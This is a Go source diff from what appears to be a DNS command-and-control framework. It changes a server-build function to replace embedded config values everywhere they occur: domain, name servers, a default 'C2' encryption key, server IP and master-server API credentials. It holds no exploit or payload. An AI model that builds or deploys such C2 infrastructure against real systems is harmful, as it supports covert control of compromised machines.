@@ -307,24 +307,25 @@ func (api *APIServer) buildDNSServer(req DNSServerBuildRequest, masterURL, apiKe
 
 	// Replace embedded config values in tryLoadEmbeddedConfig()
 	// Note: Config uses specific alignment with tabs - must match exactly
+	// Note: Replace ALL occurrences since there may be DefaultConfig() and tryLoadEmbeddedConfig()
 	configStr := string(config)
 
 	// Debug: Show what we're looking for and replacing
 	fmt.Printf("Debug: MasterServer before replacement contains empty: %v\n", strings.Contains(configStr, "MasterServer:   \"\","))
 	fmt.Printf("Debug: Replacing MasterServer with: %s\n", masterURL)
 
-	configStr = strings.Replace(configStr, "Domain:        \"secwolf.net\",", fmt.Sprintf("Domain:        \"%s\",", req.Domain), 1)
-	configStr = strings.Replace(configStr, "NS1:           \"ns1.secwolf.net\",", fmt.Sprintf("NS1:           \"%s\",", req.NS1), 1)
-	configStr = strings.Replace(configStr, "NS2:           \"ns2.secwolf.net\",", fmt.Sprintf("NS2:           \"%s\",", req.NS2), 1)
-	configStr = strings.Replace(configStr, "UpstreamDNS:   \"8.8.8.8:53\",", fmt.Sprintf("UpstreamDNS:   \"%s\",", req.UpstreamDNS), 1)
-	configStr = strings.Replace(configStr, "EncryptionKey: \"MySecretC2Key123!@#DefaultChange\",", fmt.Sprintf("EncryptionKey: \"%s\",", req.EncryptionKey), 1)
+	configStr = strings.ReplaceAll(configStr, "Domain:        \"secwolf.net\",", fmt.Sprintf("Domain:        \"%s\",", req.Domain))
+	configStr = strings.ReplaceAll(configStr, "NS1:           \"ns1.secwolf.net\",", fmt.Sprintf("NS1:           \"%s\",", req.NS1))
+	configStr = strings.ReplaceAll(configStr, "NS2:           \"ns2.secwolf.net\",", fmt.Sprintf("NS2:           \"%s\",", req.NS2))
+	configStr = strings.ReplaceAll(configStr, "UpstreamDNS:   \"8.8.8.8:53\",", fmt.Sprintf("UpstreamDNS:   \"%s\",", req.UpstreamDNS))
+	configStr = strings.ReplaceAll(configStr, "EncryptionKey: \"MySecretC2Key123!@#DefaultChange\",", fmt.Sprintf("EncryptionKey: \"%s\",", req.EncryptionKey))
 	if req.ServerAddress != "" {
-		configStr = strings.Replace(configStr, "SvrAddr:       \"98.90.218.70\",", fmt.Sprintf("SvrAddr:       \"%s\",", req.ServerAddress), 1)
+		configStr = strings.ReplaceAll(configStr, "SvrAddr:       \"98.90.218.70\",", fmt.Sprintf("SvrAddr:       \"%s\",", req.ServerAddress))
 	}
-	// Set distributed mode config (required fields)
-	configStr = strings.Replace(configStr, "MasterServer:   \"\",", fmt.Sprintf("MasterServer:   \"%s\",", masterURL), 1)
-	configStr = strings.Replace(configStr, "MasterAPIKey:   \"\",", fmt.Sprintf("MasterAPIKey:   \"%s\",", apiKey), 1)
-	configStr = strings.Replace(configStr, "MasterServerID: \"dns1\",", fmt.Sprintf("MasterServerID: \"%s\",", serverID), 1)
+	// Set distributed mode config (required fields) - replace ALL occurrences
+	configStr = strings.ReplaceAll(configStr, "MasterServer:   \"\",", fmt.Sprintf("MasterServer:   \"%s\",", masterURL))
+	configStr = strings.ReplaceAll(configStr, "MasterAPIKey:   \"\",", fmt.Sprintf("MasterAPIKey:   \"%s\",", apiKey))
+	configStr = strings.ReplaceAll(configStr, "MasterServerID: \"dns1\",", fmt.Sprintf("MasterServerID: \"%s\",", serverID))
 
 	// Debug: Verify MasterServer was set after replacement
 	fmt.Printf("Debug: MasterServer after replacement still empty: %v\n", strings.Contains(configStr, "MasterServer:   \"\","))
